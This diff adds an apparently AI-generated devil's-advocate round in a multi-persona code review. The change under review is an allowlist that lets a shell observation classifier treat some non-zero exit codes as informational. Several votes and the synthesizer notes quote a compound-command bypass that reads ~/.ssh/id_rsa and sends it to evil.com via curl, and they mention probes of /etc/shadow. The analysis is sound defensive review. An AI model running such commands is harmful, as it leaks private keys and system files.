@@ -1,0 +1,320 @@
+<devils_advocate_debate round="1">
+
+<meta>
+<persona>Devil's Advocate</persona>
+<role>Challenge majority positions; surface dissent; force conditions on concessions.</role>
+<majority_findings_identified>
+  <item code="MAJ-UNREACHABLE">Branch 3 is unreachable from runners — DA-1, AR-1, PE-4, plus RE-6 partial. Four-of-five consensus.</item>
+  <item code="MAJ-METRIC-BROKEN">cost_tokens / missed_rate gate is not computable / measures wrong thing — DA-2, AR-3, PE-1, PE-3. Four-of-five consensus.</item>
+  <item code="MAJ-SHLEX-FRAGILE">shlex.split(last_command)[0] is the wrong matcher (multi-token entries, wrappers, pipelines, empty/unbalanced) — AR-6, SA-2, RE-1, RE-2, RE-3. Five-of-five consensus.</item>
+  <item code="MAJ-30PCT-UNJUSTIFIED">The 30% threshold is unjustified / borrowed from a retired latency gate — DA-3, PE-2, PE-6. Three-of-five.</item>
+  <item code="MAJ-ESCALATION-ASYMMETRIC">False-quiet (silenced real error) is asymmetrically costly vs token win — DA-3, SA-1, SA-4, RE-4. Four-of-five.</item>
+</majority_findings_identified>
+<highest_consensus_confidence>MAJ-UNREACHABLE — DA, AR, PE all assert "HIGH/FATAL" independently, citing the same line numbers (interactive_runner.py:351; toolcall_runner.py:242-248). This is the load-bearing claim against the proposal. I will challenge it.</highest_consensus_confidence>
+</meta>
+
+<!-- ============================================================ -->
+<!-- CHALLENGE 1: against the highest-consensus position           -->
+<!-- ============================================================ -->
+<challenge id="DA-C1" target="MAJ-UNREACHABLE" targets_findings="DA-1, AR-1, PE-4, RE-6">
+<position>The "Branch 3 is unreachable" consensus is correct as a static-trace observation but is being weaponized into a stronger claim — "the PR is a no-op" — that does not survive looking at how the runners are likely to evolve once the classifier exposes the new signal. I am challenging the FRAMING, not the line numbers.</position>
+
+<argument>
+Four personas (myself included in DA-1) cite the same two guards (interactive_runner.py:351 exit_code==0 gate; toolcall_runner.py:242 short-circuit) and conclude the candidate PR is "architecturally inert" / "dead code" / "no-op." That phrasing is rhetorically convenient but factually too strong. Three concrete objections:
+
+1. **The guards are themselves recent and reversible policy, not architectural law.** The proposal's natural implementation extends to flipping those two guards. AR-1's own recommendation (option a: "explicitly include the runner-level escalation gate flip in the same PR") and PE-4's recommended fix ("modify interactive_runner.py:351 to route both exit==0 and exit!=0 through classify()") concede that the fix is mechanically a handful of lines. If a reviewer with five minutes can specify the fix, calling the original PR "dead code" overstates the gap. It is more honest to say: "the candidate's diff is incomplete by ~2 LOC at each of two sites, and the proposal undercounts."
+
+2. **The "no-op" framing ignores that the candidate's value is the INFORMATION ARTEFACT — the typed allowlist with rationale — not solely the bytes in observation.py.** Even if the runtime guards are not flipped on day one, having INFORMATIONAL_NONZERO declared in the classifier creates the schelling point that the next reader (or the same author in PR-2) flips the guards against. The consensus treats the diff as if its only value were runtime behavior change in the merge commit; that's a narrow view of how code accretes useful structure.
+
+3. **DA-1's own implication is overstated.** I (DA-1) wrote "the PR as specified would merge as a no-op." On re-reading, the more defensible claim is "the PR as specified delivers zero token reduction until two further lines are changed." Those are different statements. A no-op merge is harmless; an incomplete merge that ships a useful constant and shifts review burden to a follow-up is qualitatively different. I'm conceding ground on my own DA-1 here.
+
+The four-persona consensus is right about the unreachability fact. It is wrong about the implication. Treating "the diff is incomplete" as "the proposal is wrong" inflates the criticism into a kill-shot when it should be a scope correction. That inflation lets the panel reject A on grounds that AB does not actually fix either — AB also needs to decide what happens on non-zero exit; it just makes that decision behind an abstraction.
+</argument>
+
+<conditions_of_concession>
+I concede the unreachability fact. I challenge the leap from "unreachable" to "fatal/no-op." The honest finding is:
+- The PR is **scope-incomplete** by 2 LOC at each of 2 sites (4 LOC total), not architecturally inert.
+- The corrected scope is still smaller than the AB seam (~20 LOC vs ~150 LOC for the Protocol+two impls).
+- The "30% drop cannot occur" claim in DA-1 should be downgraded to "cannot occur without also editing the runner guards" — a substantive but local fix, not a re-design.
+</conditions_of_concession>
+</challenge>
+
+<!-- ============================================================ -->
+<!-- CHALLENGE 2: against second-highest consensus                 -->
+<!-- ============================================================ -->
+<challenge id="DA-C2" target="MAJ-METRIC-BROKEN" targets_findings="DA-2, AR-3, PE-1, PE-3">
+<position>The "metric is broken / not computable" consensus is correct but contains a hidden assumption I want to surface: that the BENCH is the right place to measure escalation precision at all. I argue the bench is structurally incapable of measuring this regardless of how many scenarios are added, and adding the new harness AR-3 / PE-1 recommend is itself a category error.</position>
+
+<argument>
+DA-2, AR-3, PE-1, PE-3 all observe that scenarios.py measures L2 byte-stream detection latency, not classifier-escalation cost. The recommended fix across these findings is some variant of: "add a new mode label `cmdaware`, add new scenarios that exercise classify() directly, add an escalation_missed_rate metric." That is internally consistent but wrong at a higher level. Three points:
+
+1. **The bench is synthetic by design** (evals/observation/scenarios.py:1-7 docstring: "reproducible shell one-liner that generates a known signal pattern"). It cannot capture the distribution of REAL screen tails that production observation traffic sees — which is the distribution that determines whether INFORMATIONAL_NONZERO produces real token savings. PE-2's recommendation ("instrument production for one week to capture baseline distribution") is the only intellectually honest approach, but it requires telemetry infrastructure the project does not have.
+
+2. **Adding `escalation_missed_rate` requires labeled ground truth** (PE-3 explicitly says "labeled ground truth per scenario"). Whoever labels has to decide whether `pgrep -af foo` exit 1 was "an escalation that should have happened" or "informational." That decision is exactly the policy decision the proposal is trying to make. Building a labeled corpus to validate the rule is building the rule, with extra steps. The bench launders a policy decision as an empirical measurement.
+
+3. **The genuinely separable safety floor is the negative-case unit test, not a bench mode.** A bench that confirms "30% cost drop on the positive corpus" tells you nothing about the corpus you didn't think of. A unit test that says "`make` exit 2 escalates, `git diff --quiet` exit 1 doesn't" is cheap, deterministic, and falsifiable. The right gate is: ship a unit-test matrix that enumerates the policy (per-command, per-exit-code), not a bench number.
+
+The consensus is debating which bench dimension to add. The right move is to question whether the bench should be touched at all for this PR.
+</argument>
+
+<conditions_of_concession>
+I concede that as written the merge gate is non-computable. I challenge the assumption that the fix is "extend the bench." The cheaper, more honest gate is:
+- A unit-test fixture enumerating (command, exit_code) → expected (EventType, needs_llm), bounded ~30 cases.
+- A pre-registered production-telemetry baseline collected over one week before opening the PR (PE-2's recommendation, which I endorse over the bench-extension path).
+- The bench stays out of this PR entirely. Coupling production code to a not-yet-existing measurement apparatus (AR-3) is the failure mode the proposal already half-acknowledges.
+</conditions_of_concession>
+</challenge>
+
+<!-- ============================================================ -->
+<!-- CHALLENGE 3: against full-consensus shlex critique            -->
+<!-- ============================================================ -->
+<challenge id="DA-C3" target="MAJ-SHLEX-FRAGILE" targets_findings="AR-6, SA-2, RE-1, RE-2, RE-3">
+<position>The five-persona pile-on against `shlex.split(last_command)[0]` is technically correct on every cited edge case (unbalanced quotes, env-var prefixes, wrappers, pipelines, compound metacharacters). But the framing — "the matcher is broken" — overlooks that the canonical normalization the personas recommend has its OWN tail of failure modes, and the canonicalization complexity is exactly the kind of accretion that the AB seam was supposed to formalize and that A claims to avoid.</position>
+
+<argument>
+RE-2 lists 6 wrapper variants; RE-3 lists 6 compound/pipeline variants; AR-6 lists 4 (env, redirect, group, pipe); SA-2 lists 3 (DoS, bypass, sandbox no-op). The recommended fixes accrete:
+- AR-6: "normalized canonical-form pass (strip env-var prefix, strip redirections, strip trailing pipes, then shlex.split and compare leading non-flag tokens against a set of tuples)"
+- SA-2: "Reject any last_command containing `;`, `&&`, `||`, `|`, `&`, backtick, `$(`, `>(`, `<(`"
+- RE-2: "Strip a known wrapper-prefix set (sudo, env, time, nice, ionice, nohup, stdbuf, setsid, chrt, taskset, unbuffered) plus their flag arguments"
+- RE-3: "Reject the allowlist entirely when ANY shell metacharacter appears unquoted"
+- RE-4: "Allowlist by (command, exit_code) PAIR, not (command, any-nonzero)"
+- RE-5: "Require the quiet/silencing flag to be present"
+- SA-3: "Match the full command head against a canonical normalization"
+
+Adding all of these turns a 25-LOC inline change into a 100+ LOC bash-aware command normalizer with its own bug surface. The personas are individually right; collectively they describe a small shell parser, which is exactly the abstraction the AB strategy seam was designed to host. The candidate-A inline approach cannot absorb all five recommendations without becoming a god-method.
+
+The unstated implication of the consensus: once you accept the laundry list of edge cases, A converges toward AB. The reason-loop voted A as "experiment-first, seam later" — but the five-persona security/reliability review here says that responsible A *is* AB without the abstraction, which is worse than AB.
+
+This is a tension worth surfacing: the personas defeat A on shlex grounds AND simultaneously hand AB the moral victory, but no one names that dynamic.
+</argument>
+
+<conditions_of_concession>
+I concede the shlex matcher is fragile as proposed. I challenge the conclusion: the responsible fix list (RE-2 wrappers + RE-3 metachar reject + RE-4 per-exit-code + RE-5 flag-required + SA-2 sandbox-aware + SA-3 canonical-head) is a parser, not a constant. If you accept the full fix list, you have rebuilt the AB seam minus the interface. The honest middle path:
+- **Minimum responsible allowlist (4 entries, exact-match only)**: `git diff --quiet` exit 1, `git diff --exit-code` exit 1, `grep -q` exit 1, `test` exit 1. Anything else falls through.
+- **Strict tokenization rule**: bail (return current behavior) on ANY of `;`, `&&`, `||`, `|`, `&`, backtick, `$(`, `<(`, `>(`, `=` in the first 4 tokens.
+- Reject the open-set framing of INFORMATIONAL_NONZERO. The set is closed; entries require a per-exit-code review and a unit test.
+</conditions_of_concession>
+</challenge>
+
+<!-- ============================================================ -->
+<!-- CHALLENGE 4: non-code hypothesis (REQUIRED by constraints)    -->
+<!-- ============================================================ -->
+<challenge id="DA-C4" target="ALL" targets_findings="(novel; extends DA-5)">
+<position>NEW NON-CODE HYPOTHESIS — **The dispute is not about the PR; it is about who owns the escalation policy long-term, and the panel composition predetermined the verdict.**</position>
+
+<argument>
+This builds on but is distinct from my prior DA-5. DA-5 argued for a written observation policy doc. The new hypothesis is **organizational**, not documentary.
+
+Observable facts from the meta-data:
+- Five personas reviewing one PR. Four (AR, PE, RE, SA) hold technical-correctness mandates. One (DA, me) holds dissent mandate. None holds an ownership/maintenance mandate.
+- handoff.json:48-53 reports the reason-loop final vote A=3, AB=2, with judge_split_axis labeled "perf/dist-sys/pragmatic (A) vs. tech-lead/long-lived (AB)" — i.e., the split is along stewardship time-horizon, not technical correctness.
+- The proposal does not nominate an owner for INFORMATIONAL_NONZERO. Two quarters from now, when `ruff check` returns exit 1 informationally for findings, `mypy --strict` returns exit 1 informationally for type errors a CI cares about but a dev session doesn't, `gh pr list --json` returns exit 1 informationally when there are no PRs, etc. — who decides what gets added? The proposal is silent.
+- The selfmod governance machinery (CLAUDE.md, `.clive/constitution.md` IMMUTABLE, file tiers, regex-only gate.py) exists precisely to formalize "which decisions are deterministic vs. require LLM judgment" — and it is conspicuously unused by this proposal even though the proposal is exactly that class of decision (when does the runtime need LLM judgment to interpret an exit code?).
+
+The hypothesis: **the technical review surface is being used to litigate an organizational question (who owns observation policy) that has no technical answer.** Both A and AB will work in a single PR. Neither will work without an owner two quarters out. The panel split A=3/AB=2 maps to "people optimizing for the PR landing" vs "people optimizing for the PR's maintainability" — i.e., a role split, not a correctness split.
+
+If this hypothesis is right, three predictions follow:
+1. Whichever artefact ships, INFORMATIONAL_NONZERO will accrete entries unsystematically, drift, and eventually be ripped out or rewritten as a config table. (Probability >0.7 given Clive's prior pattern with PaneAgent/SharedBrain per memory/MEMORY.md.)
+2. The next observation-loop incident — a silenced error that should have escalated — will be triaged as "who owns this?" and the answer will be "no one." (Probability >0.8.)
+3. A written `docs/observation-policy.md` with named owner + deprecation path would do more for cost AND safety than either A or AB. The dispute would dissolve because the code change becomes mechanical. (Confidence MEDIUM.)
+</argument>
+
+<implication>
+The right artefact for this PR is not a code diff; it is a one-page policy document (`docs/observation-policy.md`) that:
+- States the decision rule for "informational non-zero" in English with worked examples.
+- Names an owner (or a rotating ownership policy via the selfmod tier system).
+- Specifies the deprecation/add path for new entries (PR template question: "what's the exit-code semantics? what's the proof it's informational? who pages when this is wrong?").
+- References gate.py-style determinism: the regex/set IS the policy; the policy IS the regex/set.
+
+Once that exists, A vs AB collapses to a stylistic preference and either ships. Without it, both ship a policy that no one signs for.
+</implication>
+
+<conditions>
+Concede: this is non-code and outside the strict bounds of the technical review. Challenge: the technical review is itself the wrong frame. If the panel ships A or AB without addressing ownership, the technical review has succeeded at filtering syntax errors and failed at the actual question.
+</conditions>
+</challenge>
+
+<!-- ============================================================ -->
+<!-- REVISIONS TO MY OWN PRIOR FINDINGS                            -->
+<!-- ============================================================ -->
+<revisions>
+
+<revision finding_id="DA-1" change_type="DOWNGRADE">
+<from>"The PR as specified would merge as a no-op. The 30% drop cannot occur."</from>
+<to>"The PR is scope-incomplete by ~4 LOC across two runner guard sites. After that correction, the 30% drop is still ungrounded but no longer mechanically prevented."</to>
+<reason>AR-1, PE-4 cite the same evidence I did but stop short of declaring "no-op" — they say "needs runner guard inverted." On reflection their phrasing is more accurate. Inflating "scope-incomplete" into "no-op" was rhetorical overreach. See DA-C1.</reason>
+<confidence>Was HIGH; remains HIGH on the facts, MEDIUM on the implication.</confidence>
+</revision>
+
+<revision finding_id="DA-2" change_type="REFRAME">
+<from>"The success metric is unmeasurable on the existing bench."</from>
+<to>"The success metric is unmeasurable on the existing bench AND the bench is the wrong place to measure escalation precision. The right gate is a unit-test enumeration of (cmd, exit) → (event, needs_llm), plus a pre-registered production telemetry baseline."</to>
+<reason>PE-1, AR-3 converge on "extend the bench." I now think extending the bench is a category error (DA-C2). The original finding remains but the recommendation flips from "fix the bench" to "skip the bench."</reason>
+<confidence>HIGH.</confidence>
+</revision>
+
+<revision finding_id="DA-3" change_type="STRENGTHEN">
+<from>"30% threshold is unjustified, asymmetric in cost, likely satisfiable by Hawthorne-effect scenario design."</from>
+<to>"30% threshold is unjustified AND PE-2 provides the missing piece: the figure is a fossil of the streaming-observation latency criterion (phase1-report.md:40, 47-50), which was explicitly retired as unreachable. The proposal copy-pasted a retired magnitude into a new unit. This is stronger than 'Hawthorne effect'; it is dimensional-analysis sloppiness."</to>
+<reason>PE-2 found provenance I missed. The number is borrowed, not derived. Strengthens the finding.</reason>
+<confidence>Was MEDIUM; now HIGH.</confidence>
+</revision>
+
+<revision finding_id="DA-4" change_type="HOLD">
+<from>"3-2 final vote is closer to coin flip than consensus; dissent picked the long-lived axis."</from>
+<to>(unchanged)</to>
+<reason>No peer engaged this directly. It is a meta-observation about the reason-loop output, not the code; remains a useful caveat for the synthesizer.</reason>
+<confidence>MEDIUM.</confidence>
+</revision>
+
+<revision finding_id="DA-5" change_type="EXTEND">
+<from>"The real escalation surface is governance/observation policy."</from>
+<to>"The real escalation surface is governance AND the dispute is litigating ownership through technical surface (see DA-C4). Recommend `docs/observation-policy.md` with named owner."</to>
+<reason>DA-C4 generalizes DA-5 from "write a policy doc" to "the technical review frame is wrong because no role on the panel owns maintenance."</reason>
+<confidence>MEDIUM.</confidence>
+</revision>
+
+<revision finding_id="DA-6" change_type="HOLD">
+<from>"Branch 6 (UNKNOWN catch-all), not Branch 3, is the dominant exit==0 escalation drain."</from>
+<to>(unchanged — but note no peer engaged it)</to>
+<reason>This claim is testable and unaddressed. Worth flagging as an experiment the synthesizer should consider before locking on the command-aware framing.</reason>
+<confidence>MEDIUM.</confidence>
+</revision>
+
+</revisions>
+
+<!-- ============================================================ -->
+<!-- VOTES ON EVERY PEER FINDING                                   -->
+<!-- ============================================================ -->
+<votes>
+
+<!-- AR (Architecture Reviewer) -->
+<vote on="AR-1" verdict="STRONG_AGREE" confidence="HIGH">
+  Same evidence as DA-1, more precisely stated. AR's option (b) recommendation — "push the INFORMATIONAL_NONZERO check up to the runner sites and leave classify() alone" — is architecturally cleaner than my DA-1 framing and I endorse it. Strongest finding in the panel.
+</vote>
+
+<vote on="AR-2" verdict="AGREE" confidence="HIGH">
+  Sharp catch on toolcall_runner.py:75 result-dict schema. Disagrees with "2 lines" in a concrete, verifiable way. I had not noticed the pre-wrap/post-wrap distinction; this is exactly the bug class a typed seam would surface and inline-approach hides.
+</vote>
+
+<vote on="AR-3" verdict="AGREE_WITH_CONDITIONS" confidence="HIGH">
+  Agree the bench is mis-advertised. Disagree the fix is "widen the PR scope." Per DA-C2, the correct response is to drop bench coverage from this PR and use a unit-test matrix instead. AR's recommendation is correct in isolation but inflates PR scope.
+</vote>
+
+<vote on="AR-4" verdict="STRONG_AGREE" confidence="HIGH">
+  The god-object accretion argument is the most underrated finding in the panel. The point that classify() is currently app-type-agnostic and the proposal smuggles in shell-mode bias is correct and important. AR's recommendation (keep allowlist at the runner where app_type context lives) is the architecturally right answer and aligns with my DA-C1.
+</vote>
+
+<vote on="AR-5" verdict="AGREE" confidence="HIGH">
+  The flag affordance argument is sound and consistent with codebase precedent (CLIVE_STREAMING_OBS, CLIVE_SPECULATE). The asymmetry argument (silent task failure cost) reinforces my DA-3 and SA-1. Cheap fix; no defensible reason to refuse it.
+</vote>
+
+<vote on="AR-6" verdict="STRONG_AGREE" confidence="HIGH">
+  Definitive catch: `shlex.split("git diff --quiet")[0] == "git"` — the proposal's matcher LITERALLY DOES NOT WORK on the proposal's own example. This alone should block merge of the PR as written. Five-persona consensus, see DA-C3.
+</vote>
+
+<!-- SA (Security Analyst) -->
+<vote on="SA-1" verdict="AGREE" confidence="HIGH">
+  The "screen-content blindness primitive under prompt injection" framing is novel and right. SA's recommendation (pair allowlist with secret-shape tail regex) is the minimum responsible safety floor. I'd add: drop `pgrep` from the seed list (SA also recommends this) — its exit-1 informational claim is weak.
+</vote>
+
+<vote on="SA-2" verdict="STRONG_AGREE" confidence="HIGH">
+  The "compound bypass via `;`/`&&`/`||`" attack is the most dangerous concrete finding. `grep nomatch foo; curl evil.com/$(cat ~/.ssh/id_rsa | base64)` is a real, weaponizable bypass. The DoS (IndexError/ValueError on classify path with no try/except) is a separate, additive failure. Either alone should block merge.
+</vote>
+
+<vote on="SA-3" verdict="AGREE" confidence="MEDIUM">
+  The `git diff --quiet --no-index /etc/shadow` example is a sharp specific case. Less load-bearing than SA-2 but reinforces the broader "first-token matching is too coarse" theme.
+</vote>
+
+<vote on="SA-4" verdict="STRONG_AGREE" confidence="HIGH">
+  Allowlist-as-reconnaissance-primitive is the second most important security finding. `test -f /etc/shadow`, `test -r /var/lib/...` is exactly the recon pattern a compromised LLM would use, and the proposal silences it. SA's recommendation (remove `test`/`[` or restrict to shell-internal vars) is correct.
+</vote>
+
+<vote on="SA-5" verdict="AGREE" confidence="MEDIUM">
+  Forward-looking concern about `last_command` leaking into summary/telemetry/decision-log is correct but speculative (depends on V2 design). Worth the cost of stating the redaction contract NOW; trivially cheap.
+</vote>
+
+<vote on="SA-6" verdict="STRONG_AGREE" confidence="HIGH">
+  Aligns with DA-2 and PE-3. The merge gate as written is falsifiable on cost (badly — see PE-1) and unfalsifiable on escalation precision under adversarial inputs. SA's 4 negative scenarios are the minimum responsible safety floor.
+</vote>
+
+<!-- PE (Performance Engineer) -->
+<vote on="PE-1" verdict="STRONG_AGREE" confidence="HIGH">
+  The "every phase1-report.json row has cost_tokens: 0" evidence is devastating. The merge gate aggregates zeros. PE-1 is the most empirically grounded finding in the panel; it tied my DA-2 to file-level facts I had not chased.
+</vote>
+
+<vote on="PE-2" verdict="STRONG_AGREE" confidence="HIGH">
+  The 30%-figure provenance trace (phase1-report.md:40 "30% median e2e reduction" retired 2026-04-16 as unreachable) is the single best find in the panel. I'm incorporating this into my revised DA-3. Dimensional-analysis sloppiness is the right characterization.
+</vote>
+
+<vote on="PE-3" verdict="STRONG_AGREE" confidence="HIGH">
+  `missed_rate` measures byte-event detection coverage, not classifier-escalation false-negatives. The gate cannot detect the failure mode it is supposedly guarding. Pairs cleanly with SA-6 and DA-2.
+</vote>
+
+<vote on="PE-4" verdict="STRONG_AGREE" confidence="HIGH">
+  Same evidence as DA-1, AR-1. Four-persona convergence on the unreachability fact. See DA-C1 for my challenge to the over-strong "no-op" framing.
+</vote>
+
+<vote on="PE-5" verdict="AGREE" confidence="MEDIUM">
+  shlex.split hot-path cost is real but small. The principle (no unmeasured parse on hot path) is correct; the magnitude is below noise floor. PE's `last_command.split(None, 1)[0]` is a cheap improvement.
+</vote>
+
+<vote on="PE-6" verdict="AGREE" confidence="MEDIUM">
+  N=10 is too small for a 30% median CI claim. Correct in isolation; downstream of PE-1 being fixed first. If PE-1 is unaddressed, PE-6 is moot.
+</vote>
+
+<!-- RE (Reliability Engineer) -->
+<vote on="RE-1" verdict="STRONG_AGREE" confidence="HIGH">
+  ValueError/IndexError on classify-call-site with no try/except is a per-turn runner crash. Concrete, easy to reproduce, no controversy. Pairs with SA-2.
+</vote>
+
+<vote on="RE-2" verdict="AGREE" confidence="HIGH">
+  Wrappers (sudo, env, time, nice, stdbuf, xargs) defeat first-token matching. Mostly "safe miss" (extra LLM call) but `time grep ...` and `stdbuf -oL grep ...` are common idioms that won't benefit. The asymmetry argument is reasonable.
+</vote>
+
+<vote on="RE-3" verdict="STRONG_AGREE" confidence="HIGH">
+  Pipelines and `&&`/`||` are the most common shell idioms. `git diff --quiet || git commit -am 'wip'` is real and the proposal misclassifies it. Pairs with SA-2 compound bypass. The recommendation (bail on metacharacters) is mandatory.
+</vote>
+
+<vote on="RE-4" verdict="STRONG_AGREE" confidence="HIGH">
+  Per-(cmd, exit_code) pair allowlist instead of (cmd, any-nonzero) is the right shape. `git diff --quiet` exit 128 (not a repo / disk full) being silenced as informational is exactly the silent-task-failure mode AR-5 warned about. This is the lowest-controversy, highest-leverage proposal refinement in the panel.
+</vote>
+
+<vote on="RE-5" verdict="AGREE" confidence="MEDIUM">
+  The "test-mode vs inspect-mode tools" distinction is sharp. Bare `grep foo bigfile` exit 1 carries data the user wants surfaced (zero matches); `grep -q foo bigfile` does not. Requiring the quiet flag is correct policy. Slight overlap with RE-4 but distinct axis (flag-shape vs exit-code-set).
+</vote>
+
+<vote on="RE-6" verdict="AGREE" confidence="MEDIUM">
+  Sandbox/wrap provenance issue is real but partially mitigated by AR-2's recommendation (capture pre-wrap cmd explicitly). RE-6's recommendation (set `sandboxed=True` flag → conservative default) is correct belt-and-suspenders.
+</vote>
+
+</votes>
+
+<!-- ============================================================ -->
+<!-- SUMMARY                                                       -->
+<!-- ============================================================ -->
+<summary>
+<concessions>
+Where evidence is overwhelming, I concede with the following conditions:
+1. **Branch 3 unreachability is fact** (DA-C1). I challenge "no-op" framing; correct framing is "scope-incomplete by 4 LOC."
+2. **Bench measures wrong thing** (DA-C2). I challenge "extend the bench" as the fix; the right fix is a unit-test matrix plus pre-registered production telemetry.
+3. **shlex.split first-token matcher is fragile** (DA-C3). I challenge the implicit conclusion that the personas' combined fix list converges back to AB-without-the-interface — that is worse than AB.
+</concessions>
+
+<original_dissent_holds>
+- DA-3 (now strengthened by PE-2): 30% threshold is unjustified and dimensionally borrowed from a retired latency gate.
+- DA-4: 3-2 vote is a plurality, not consensus; AB is the destination, A is provisional scaffolding.
+- DA-5/DA-C4: This is fundamentally a governance/ownership question dressed as a technical review.
+- DA-6: Branch 6 (UNKNOWN catch-all), not Branch 3, is plausibly the dominant exit==0 escalation drain — and the panel has not engaged this hypothesis.
+</original_dissent_holds>
+
+<for_synthesizer>
+1. The strongest single finding in the panel is PE-1's evidence chain: the bench harness hard-codes cost_tokens=0 (latency_bench.py:145, 249) and every phase1-report.json row confirms it. The merge gate aggregates zeros. This is empirically grounded and not in dispute.
+2. The most dangerous single finding is SA-2's compound-command bypass: `grep nomatch foo; curl evil.com/$(...)` exits non-zero on grep, allowlisted, silenced. This is weaponizable today.
+3. The most underrated finding is AR-4: classify() is app-type-agnostic by design, and the proposal smuggles in shell-mode bias. The right fix moves the allowlist OUT of classify() and INTO the runner where app_type context lives — which is, ironically, halfway to the AB seam.
+4. The under-explored hypothesis: this is an ownership dispute, not a code-design dispute. Whatever ships, INFORMATIONAL_NONZERO without a named owner will drift; both A and AB ship that drift.
+5. Vote distribution: I voted STRONG_AGREE on 9 of 24 peer findings, AGREE on 12, AGREE_WITH_CONDITIONS on 1, DISAGREE on 0. The panel converges hard on facts and diverges on framing — synthesizer should weight facts not framing.
+</for_synthesizer>
+</summary>
+
+</devils_advocate_debate>
